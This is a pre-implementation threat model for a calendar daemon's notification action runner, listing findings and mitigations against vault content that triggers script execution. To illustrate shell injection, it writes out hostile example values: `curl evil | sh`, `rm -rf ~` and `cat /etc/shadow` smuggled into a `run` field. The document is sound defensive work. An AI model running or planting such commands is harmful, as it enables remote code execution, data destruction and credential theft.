# calemdar notification subsystem — pre-implementation threat model

Commit: main @ `/home/archerr/Git/arch-err/Tools/calemdar` (pre-implementation; no notif-subsystem code yet)
Scope: the upcoming multi-backend notification subsystem (system / libnotify, ntfy, extensible registry), per-event opt-in via frontmatter `notify:` arrays on events and recurring roots, configurable lead times, and an **action runner** that executes a script referenced in `notify.run`.
Threat model: the daemon runs as `systemd --user` with full user privileges. Vault is on the user's laptop and **syncthing-replicated to the user's other devices only**. Anything in the vault therefore arrives from a peer that is, by trust definition, the user; but the threat surface widens compared to v1 because vault contents now drive **executable side effects**, not just file writes and an HTTP POST. The relevant adversaries:

1. **Sync-channel compromise** — a syncthing peer is misplaced, stolen, or malware-resident on a phone/tablet. Attacker writes a `.md` under `events/` or `recurring/`. Vault → laptop daemon → side effects.
2. **Untrusted local writers** — anything else on the laptop with write access to the vault dir (a misbehaving plugin in Obsidian, a leaked sync token in another tool, an editor that opens an attacker-supplied file in-place). Same blast radius as (1).
3. **Self-foot-gun** — the user pastes an event from an untrusted source (a calendar invite, a shared template) without reading it.

All three converge on the same concrete primitive: **arbitrary YAML in frontmatter must be assumed hostile**, and arbitrary YAML can drive script execution. v1 had no such pathway — the worst a poisoned `.md` could do was distort the SQLite cache or push a confusing ntfy message. v2 adds an executable.

## Executive summary

The notif subsystem changes the daemon's worst-case capability from "writes to vault and POSTs HTTP" to **arbitrary local code execution at user privilege level, triggered by file content**. The single most important design decision is whether the action runner exists at all in v1, and if it does, what trust boundary gates it. The default-deny posture taken by the rest of the codebase (allowlists for calendars, regex on slugs, traversal checks on `base_path`) needs to extend cleanly here, or this subsystem becomes the path of least resistance for every other adversary in the model.

There are **2 critical, 3 high, 4 medium, 3 low, 2 informational** findings below. Three guardrails are non-negotiable for v1: (a) `run` must be opt-in via a config-level kill switch, off by default; (b) `run` must execute via `exec.Command(path, args...)`, never via a shell, with arguments passed as discrete strings, not interpolated; (c) the resolved binary path must live inside an explicit allowlist directory (or pass an absolute-path + on-disk check) — vault content cannot smuggle in a fresh script via a relative path or a `~`/`$HOME` expansion.

The trust-shape mismatch between syncthing peers (mobile, possibly compromised) and the daemon's privilege level is the **design-level** finding worth pausing on: a stolen phone with the syncthing token is currently equivalent to a remote shell on the laptop once notif `run` lands. Mitigating this purely in the daemon is hard; mitigating it by putting `run` behind a separate, manually-edited file outside the synced vault is easy and is the recommendation in C2 below.

## Findings

### Critical

**C1 — `notify.run` from frontmatter is arbitrary user-privilege RCE driven by vault content.**
*Surface:* parsing of the `notify:` array on `Root` (`internal/model/root.go`) and `Event` (`internal/model/event.go`); whatever new spawn site lands in `internal/notify/` or a sibling.
A `recurring/foo.md` with frontmatter:
```yaml
notify:
  - lead: 5m
    run: /tmp/x.sh
```
becomes a scheduled call to `/tmp/x.sh` on the user's laptop, fired by the user-level systemd unit. Anyone who can write to the vault — a syncthing peer (phone, tablet), a compromised Obsidian plugin, or a stolen second device — can drop this file and own the laptop. The current vault model treats the vault as user-trusted because the only side effects v1 produces are file writes and HTTP POSTs; that assumption breaks the moment `run` exists.
**Mitigation:**
- **Default-off kill switch** in `~/.config/calemdar/config.yaml`: `notifications.actions.enabled: false`. Document loudly in the README that turning this on widens the trust boundary to every device that holds the syncthing token.
- **Allowlist of script paths**, not a free-form path. Concrete shape: `notifications.actions.allow:` is a list of absolute paths. At dispatch time, resolve `notify.run` to an absolute path with `filepath.Abs` and `filepath.EvalSymlinks`, then check exact membership in the allowlist. Reject anything else with a logged error and skip the notify entry. No globs, no prefix matching.
- **Optional but strongly recommended:** the allowlist itself lives in `~/.config/calemdar/config.yaml`, **outside the synced vault**. A syncthing-side attacker cannot extend the allowlist; they can only point `run` at one of the user's pre-blessed scripts.
- Log every spawn at INFO with `path`, `args`, `event-path`, `lead`, `pid`. Audit trail for the user, and a clear signal in the journal if something starts firing unexpectedly.

**C2 — Frontmatter `run` field bypasses the v1 "vault is trusted because side effects are inert" assumption — design issue, not implementation.**
*Surface:* the design proposal itself.
v1's design treats the vault as a low-stakes input because the daemon's outputs are file writes (to the same vault) and ntfy POSTs (HTTP, no arg-passing). Notifs introduce **arg-passing from vault to spawn**, which is qualitatively different. Even a perfect implementation of C1 leaves a usability footgun: every `recurring/<x>.md` is now an executable hook from the perspective of any peer device, and users will not reliably remember which events have a `run:` until something fires unexpectedly.
**Mitigation (design-level):**
- Consider moving `run:` *out* of the markdown file entirely. Two-file model: vault `recurring/foo.md` declares `notify: [{lead: 5m, action: pre-meeting}]` (an action *name*, not a script path); `~/.config/calemdar/actions.yaml` (un-synced) maps action names to script paths. The vault never carries an executable string. This is the cleanest separation: the synced surface is data, the unsynced surface is policy.
- If shipping the inline `run:` form is non-negotiable, gate it behind an explicit per-file marker that the user must add manually (e.g. `notify-run-confirmed: true` next to `run:`, with the daemon refusing to spawn without it). Annoying, on purpose.
- At minimum, document the trust-shape change in `docs/design.md` so the next reviewer/contributor sees the same warning.

### High

**H1 — Shell-metachar / interpreter abuse in `run`.**
*Surface:* spawn site (`internal/notify/run.go` or equivalent).
A naive implementation that does `exec.Command("sh", "-c", entry.Run)` (or `bash -c`) makes every shell metacharacter live: `run: foo.sh; curl evil | sh`, `run: foo.sh && rm -rf ~`, `run: $(cat /etc/shadow)`. Even without `sh -c`, `exec.Command(entry.Run)` with a single concatenated string is a surprise: Go's `exec.Command` does not re-tokenise, so `run: "/usr/bin/env bash -c 'curl evil'"` is treated as a binary literally named `/usr/bin/env bash -c 'curl evil'` (which fails) — the *real* trap is splitting `Fields(entry.Run)` and passing the head as the binary, which most implementations do.
**Mitigation:**
- Require `notify.run` to be a single absolute path string (no spaces, no flags). For arguments, use a separate `args:` list of strings.
- Spawn via `exec.CommandContext(ctx, run, args...)`. Never pass user content as `sh -c` input. Never split by whitespace.
- Reject `run` values matching: contains any of `;|&$\`<>(){}[]*?#~"'\\` (yes, `~` — no shell-style home expansion); contains a newline or carriage return; contains `..`; does not start with `/`; resolves outside the C1 allowlist after `EvalSymlinks`.
- Validate `args` per element: each must be non-empty, must not contain `\x00`, must be ≤ 4 KiB. No argv splitting from a single string.

**H2 — Path traversal / symlink swap on `run` allowlist.**
*Surface:* C1's allowlist resolution.
`/home/user/bin/safe.sh` is on the allowlist; `/home/user/bin/safe.sh` is a symlink the attacker rewrote to `/tmp/evil.sh`. Or the allowlist contains `/home/user/bin/safe.sh` and the attacker creates `/home/user/bin/../bin/safe.sh` and an event references that exact string.
**Mitigation:**
- Always normalise: `abs, _ := filepath.Abs(entry.Run); resolved, _ := filepath.EvalSymlinks(abs)`. Compare `resolved` against allowlist entries that have themselves been pre-normalised at config-load time.
- Reject if `EvalSymlinks` fails (means the file doesn't exist or is dangling — don't try to spawn it).
- Refuse to spawn anything in a world-writable directory (`os.Stat` parent, check `mode & 0o002`). `/tmp` is the obvious offender; surface it in the rejection log.
- Refuse to spawn if the resolved file is itself world-writable or world-executable but owned by another user. `os.Stat` + uid check.

**H3 — Env-var injection / template interpolation into spawned env or argv.**
*Surface:* whatever convenience-feature lets the user pass event metadata to the script (likely `args: ["{{.Title}}", "{{.StartTime}}"]` or `env: {EVENT_TITLE: "{{.Title}}"}`).
The event title is user-content from a markdown file. If args/env support template substitution from the event:
- A title containing a newline (`Foo\nBar`) injected into an env var becomes two env entries on some shells if the script later does `eval`, or breaks `$ENV_TITLE` parsing if the script `echo`s it into another tool.
- A title containing `; rm -rf ~` is harmless argv-wise (Go's `exec.Cmd.Env` and `Args` are not re-tokenised) but becomes lethal if the script does `bash -c "echo $1"`. The vulnerability is downstream, but the daemon hands the loaded gun.
- An event title with NUL bytes (`\x00`) gets truncated by some libc consumers — confusing rather than exploit-shaped, but a bug.
**Mitigation:**
- Strip / reject control characters (`\x00-\x08`, `\x0a-\x1f`, `\x7f`) in any string handed to the child process via env or argv. Concrete rule: pre-spawn, run each arg/env-value through a `regexp.MustCompile(`[\x00-\x1f\x7f]`).ReplaceAllString(s, " ")` and log if anything was substituted, so the user can see the source event.
- Cap each arg/env-value at 4 KiB. Reject the whole spawn if any value exceeds that.
- Document loudly: "scripts MUST treat all environment variables and arguments as untrusted user content. Do not eval them. Quote every variable expansion. Use `printf %s` not `echo`."
- Pass event metadata via env, not argv, with a fixed prefix (`CALEMDAR_EVENT_TITLE=…`, `CALEMDAR_EVENT_DATE=…`) so the script's own argv isn't conflated with calendar data.

### Medium

**M1 — Backend secret leakage to spawned scripts via env.**
*Surface:* spawn site env construction.
Go's `exec.Cmd.Env` defaults to the parent's env if nil. The daemon's parent env may contain `NTFY_TOKEN`, `NTFY_PASSWORD`, or other secrets the user exported into the systemd unit's `Environment=` directive (or, worse, into the URL via `https://user:pass@…`). A script spawned by the daemon inherits all of it.
**Mitigation:**
- Build the child env explicitly. Start from an empty `[]string{}`, add only what the script needs: `PATH`, `HOME`, `LANG`, `USER`, plus `CALEMDAR_*` event metadata. Drop everything else.
- Specifically exclude any env var matching `(?i)(token|secret|password|key|auth)`, even from the curated set, as a belt-and-braces measure.
- Never pass `n.cfg.NtfyURL` (which may carry basic-auth) into the child env. There is no legitimate reason for a notify-action script to know the ntfy URL.

**M2 — Backend secret leakage to logs (extension of v1 M1).**
*Surface:* every log site that mentions a backend URL or token.
v1 already redacts the ntfy URL via `redactURL` in `internal/notify/notify.go:29-35`. Extending the registry to libnotify, ntfy, and pluggable backends multiplies the log sites. New backends will likely be added without remembering to redact.
**Mitigation:**
- Define a `Backend` interface with a `LogID() string` method that returns a redacted, stable identifier (`"ntfy:my-topic"`, `"libnotify:user@host"`). All log lines reference `LogID()`, never the raw URL or any auth material.
- Add a `BackendConfig` validator that runs `url.Parse` + `Redacted()` on every URL field at config-load time and stores the redacted form alongside the raw. Logs read the redacted form; spawn sites read the raw form. Wiring the wrong one fails type-check, not just review.

**M3 — DoS via large `notify` arrays / fast-firing scheduler / fork storm.**
*Surface:* `notify:` array size on a single event; LeadMinutes count; tick frequency; spawn parallelism.
A `recurring/foo.md` with `notify:` containing 10 000 entries, each with a different lead, becomes 10 000 scheduler entries × N spawn attempts per tick. A fast `lead: 1s` (if sub-minute leads are accepted) plus a poorly-written script that takes 90 s to exit creates a fork bomb if there's no concurrency cap.
**Mitigation:**
- Cap `len(notify)` per event at, say, 16 entries. Reject parsing the file with a clear error if exceeded.
- Cap per-config `LeadMinutes` at 16 entries (extend v1 limit if there isn't one already — `internal/config/config.go:141-145` only checks positivity).
- Minimum lead value: refuse anything below 1 minute. Sub-minute leads add precision pressure on the tick loop without giving the user real value.
- Per-process semaphore on `run` spawns. Concrete: `chan struct{}` of capacity 4; spawn blocks on send. Excess spawns log "skipped: run-pool full" and drop the notify (don't queue).
- Per-script timeout: `exec.CommandContext` with a 30 s timeout. SIGTERM on timeout, SIGKILL after 5 s grace. Reaped reliably so zombies don't accumulate.
- Per-script memory/CPU is left to the script; document that the daemon does not sandbox the child. (Going further would mean cgroups via systemd-run, which is out of scope but listed here for the next reviewer.)

**M4 — `notify_fired` / dedupe state-file corruption or write-amplification.**
*Surface:* whichever store the new subsystem uses to persist "already-fired" markers across daemon restarts. v1 holds dedupe in-memory only (`Notifier.seen`, `internal/notify/notify.go:57`); v2 will need a persistent table to survive restarts within a lead window.
- Concurrent writes: the tick loop and a future "manual fire" CLI command both writing the same row → SQL `UNIQUE` violations or race.
- Corrupt entry: a malformed `lead` value in frontmatter (e.g. `lead: ../../etc/passwd`) gets composed into the dedupe key and stored — depending on the schema this is harmless (TEXT column) or harmful (someone parses the key apart later).
- Unbounded growth: dedupe rows for events that have been deleted from disk are never reaped.
**Mitigation:**
- Schema: `(event_path TEXT, lead_seconds INTEGER, fired_at_unix INTEGER, PRIMARY KEY(event_path, lead_seconds))`. `lead` stored as parsed seconds, not as raw string. Forces validation at parse time.
- All inserts use `INSERT OR IGNORE` and treat the conflict as "already fired". No race-prone read-then-write.
- Reaper: nightly job (extend `runNightly` in `internal/serve/nightly.go`) deletes rows where `fired_at_unix < now - 7d`. Bounded growth.
- Validate every `lead` value at parse time: must be a duration string parseable by `time.ParseDuration`, must be ≥ 1 minute, must be ≤ 30 days. Reject the whole `notify` entry on failure with a logged error citing the source path.

### Low

**L1 — Time-based misfires from clock skew, DST, or timezone confusion.**
*Surface:* the tick loop matching `now + lead` against an event start time. v1 already has a `windowHalf = 30s` slack (`internal/notify/notify.go:45`). v2 inherits the same logic but adds the action runner — so a misfire is no longer "the user got a confusing push", it's "a script ran at the wrong wall-clock time".
- DST transition: an event scheduled at `02:30` local on the spring-forward day doesn't exist; the lead window matches twice on fall-back. v1 already lives with this for ntfy. With `run`, "ran twice" matters more (idempotency burden moves to the script).
- NTP skew on the laptop: a laggy clock fires the action late.
- Daemon was suspended (laptop closed): on resume, the tick loop wakes and matches every "missed" lead window in one shot. Could fire many actions in rapid succession.
**Mitigation:**
- On daemon startup (or after a `time.Now()` jump > 5 minutes between ticks — detectable via comparing `time.Now()` to the previous tick + `tickInterval`), enter "skew-recovery" mode: do not fire `run` actions for windows that the daemon should have processed during the gap. Only fire ntfy-style notifs for those (informational). User opts in to "fire actions after suspend" via config if they really want it.
- Document that scripts must be idempotent (the daemon makes no guarantee of exactly-once).
- Continue using the dedupe table from M4 as the second line of defence: if a `(path, lead)` pair fired in the last hour, skip.

**L2 — `notify.run` argv leakage to other local users via `/proc`.**
*Surface:* spawn site argv.
On Linux, `/proc/<pid>/cmdline` is world-readable by default. Anything in argv is visible to every other user on the laptop for the lifetime of the child. If a user's `args:` contains a personal token (e.g. `{API_KEY}` interpolated from somewhere), it's visible.
**Mitigation:**
- Document in the user-facing README: "do not put secrets in `args`. Pass secrets via `env` (which is readable only by you) or have the script read them from a file."
- If feeling thorough, expose only `env`, not `args`, in v1. Adds a constraint, but argv is a security wart and dropping it removes a footgun.
- Note: env in `/proc/<pid>/environ` is mode 0600 owned by the running user, so safe from other local users on a sane system. Still not safe from another process running as the same user — but that's outside our threat model.

**L3 — `notify` array on `recurring/<x>.md` propagates to every expanded event.**
*Surface:* `internal/reconcile/series.go` (not read here, but the v1 design has the recurring root's body copied into each expanded event verbatim — see `model.Root.Body` comment, `internal/model/root.go:21-22`).
If `notify:` lives in the root and gets stamped into every expanded `events/<cal>/<year>/<date>-<slug>.md`, then a single edit to the root mass-produces hundreds of `run`-bearing event files. Not a vuln in itself, but raises the surface area of the C1 attack: an attacker who modifies one `recurring/foo.md` causes the daemon to schedule actions for every future occurrence in the 12-month horizon, all at once after reconcile.
**Mitigation:**
- Decide the propagation rule explicitly: roots' `notify:` is *referenced* at fire-time (read live from the root file), not *copied* into each event. Single source of truth, no fan-out, cleaner edit semantics.
- If propagation must be copy-style, at least cap occurrences-per-reconcile — refuse to expand a recurring root that would generate > 1 000 occurrences in the horizon (probably already implicit via horizon * frequency caps elsewhere; verify).

### Informational

**I1 — Backend registry expansion as a future foot-gun.**
The brief mentions an "extensible registry" for backends. Each new backend is a new place where:
- secrets can leak to logs (M2),
- spawn or HTTP arg construction can mishandle untrusted strings (H1, H3),
- env can leak (M1).
Recommend a single `Backend` interface with audited methods (`Send(ctx, body, headers, logID) error`), and require every new implementation to ship with: a unit test that asserts no raw URL appears in logs; a test that confirms control characters in the body don't break wire framing; a code review checkbox referencing this document. Future-proofing is cheaper than auditing each backend separately.

**I2 — libnotify backend has its own surface (`notify-send` argv).**
If the system-notif backend is implemented by shelling out to `notify-send`, it inherits a small version of H1/H3: event title/body becomes argv to `notify-send`. `notify-send` itself does not interpret shell metachars (no shell involved if invoked via `exec.Command`), but it does interpret a small Pango markup subset on some libnotify versions. Title `<a href="…">click</a>` may render as a link. Low impact under the threat model (it's the user's own notification daemon rendering it locally) but worth acknowledging. Mitigation: pass `--no-markup` if available, or strip `<` `>` `&` from title/body before invoking. No shell wrapping.

## Surfaces explicitly out of scope for this review

- The libnotify backend's binary itself (system component, trusted).
- The ntfy server's behaviour (remote system, separate trust domain).
- syncthing's transport security (covered by syncthing's own threat model).
- The Obsidian plugin's vault-write behaviour (it's the user's editor; its compromise is equivalent to the user's compromise).

## Top-3 must-implement before v2 ships

1. **`notifications.actions.enabled: false` by default**, with an allowlist of resolved absolute script paths in `~/.config/calemdar/config.yaml` (un-synced). No `run:` spawns at all if either is missing. Covers C1, C2, H2.
2. **`exec.Command(path, args...)` with explicit child env**, no `sh -c`, no `Fields()` splitting, no parent-env inheritance. Covers H1, H3, M1.
3. **Bounded everything**: cap `notify` array size per event (16), cap LeadMinutes per config (16), minimum lead (1 minute), per-spawn timeout (30 s), concurrent-spawn semaphore (4), dedupe TTL reaper. Covers M3, M4, L1.

## One design-level recommendation

Move `run:` out of the synced markdown. Vault carries action *names*; `~/.config/calemdar/actions.yaml` (un-synced, on the laptop only) maps names to scripts. The synced surface stays inert. This is the single change that meaningfully reduces the trust-shape mismatch surfaced in C2 — every other mitigation in this document is a defence-in-depth layer on top of "the vault is allowed to declare what to run". If the vault can only declare *which* of N pre-blessed actions to invoke, the worst a sync-channel attacker can do is fire one of the user's own scripts at the wrong time.
